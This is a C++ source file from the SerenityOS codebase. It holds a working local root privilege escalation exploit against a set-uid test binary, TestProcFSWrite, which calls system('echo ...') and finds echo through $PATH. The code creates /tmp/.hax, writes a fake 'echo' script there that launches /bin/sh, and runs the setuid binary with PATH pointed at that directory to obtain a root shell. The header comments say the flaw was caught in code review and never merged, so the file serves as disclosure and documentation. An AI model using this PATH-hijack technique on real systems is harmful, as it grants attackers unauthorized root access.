/*
 * Copyright (c) 2021, the SerenityOS developers.
 *
 * SPDX-License-Identifier: BSD-2-Clause
 */

// TestProcFSWrite local root privilege escalation -1day exploit
// ---
// The TestProcFSWrite test is set-uid root:
//   -rwsr-xr-x   1    root    root      69464   2021-10-29 05:36:46  /usr/Tests/Kernel/TestProcFSWrite
// And relies on the environment $PATH to find the `echo` executable in a call to `system()`:
//    system("echo >> /proc/self/unveil");
// ---
// Note: This bug was caught during review and never merged into SerenityOS.
// - https://github.com/SerenityOS/serenity/pull/10661#issuecomment-954466083
// See `10661.diff` for the original affected `TestProcFSWrite.cpp` source.
// ---
// ~ bcoles 2021-10-28

#include <LibCore/ArgsParser.h>
#include <LibCore/File.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>

int main(int argc, char** argv)
{
    outln("TestProcFSWrite local root LPE");

    const char* path = "/usr/Tests/Kernel/TestProcFSWrite";

    Core::ArgsParser args_parser;
    args_parser.add_option(path, "Path to TestProcFSWrite", nullptr, 'p', "path");
    args_parser.parse(argc, argv);

    outln("[.] Creating directory: '/tmp/.hax' ...");
    mkdir("/tmp/.hax", 0755);

    system("/bin/echo '#!/bin/sh' > /tmp/.hax/echo");
    // system("/bin/echo '/bin/id>/tmp/pwned' >> /tmp/.hax/echo");
    system("/bin/echo 'export PATH=/usr/local/bin:/usr/bin:/bin' >> /tmp/.hax/echo");
    system("/bin/echo '/bin/sh 1>/dev/stderr' >> /tmp/.hax/echo");
    system("/bin/chmod +x /tmp/.hax/echo");

    auto cmd = String::formatted("export PATH=/tmp/.hax ; {}", path);
    outln("[.] Executing command: {}", cmd);
    system(cmd.characters());

    // system("/bin/cat /tmp/pwned");

    return 0;
}
